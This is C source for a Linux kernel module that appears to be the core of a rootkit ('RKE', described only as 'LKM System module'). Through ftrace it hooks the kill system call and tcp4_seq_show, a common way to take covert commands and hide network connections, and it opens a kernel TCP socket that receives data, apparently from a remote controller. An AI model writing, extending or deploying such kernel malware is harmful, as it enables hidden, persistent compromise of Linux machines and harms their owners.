#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/sched.h>
#include <linux/socket.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/in.h>

#include "../include/hooks/ftrace_helper.h"
#include "../include/connector/tcp.h"
#include "../include/hooks/hooks.h"

static struct socket * sock;
static struct task_struct *thread;

MODULE_LICENSE("GPL");
MODULE_AUTHOR("voidbyte, oromos");
MODULE_DESCRIPTION("LKM System module");

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("tcp4_seq_show", hook_tcp4, &orig_tcp4_seq_show),
};

static int __init lkm_init(void) {
    int ret;
    printk(KERN_INFO "RKE loaded\n");

    ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(ret){
        return ret;
    }
    ret = socket_init(sock, thread);
    if (ret < 0) {
        printk(KERN_INFO "socket_init failed\n");
    }
    char buff[60];
    ret = tcp_recv(sock, buff, sizeof(buff));
    if(ret < 0){
        printk(KERN_INFO "tcp_recv failed\n");
    }

    return 0;
}

static void __exit lkm_exit(void) {
    printk(KERN_INFO "RKE unloading\n");
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    if (thread){
        int ret = kthread_stop(thread);
        if(ret != -EINTR){
            printk(KERN_INFO "tcp_recv thread has stopped\n");
        }
        thread = NULL;
    }

    if (sock) {
        if (sock->sk && sock->sk->sk_state == TCP_ESTABLISHED) {
            printk(KERN_INFO "Closing socket connection\n");
            if (sock->ops) {  // Check if sock->ops is not NULL
                sock->ops->shutdown(sock, SHUT_RDWR);
            } else {
                printk(KERN_WARNING "sock->ops is NULL\n");
            }
        }
        sock_release(sock);
        sock = NULL;
        printk(KERN_INFO "Socket released successfully\n");
    }
}

module_init(lkm_init);
module_exit(lkm_exit);
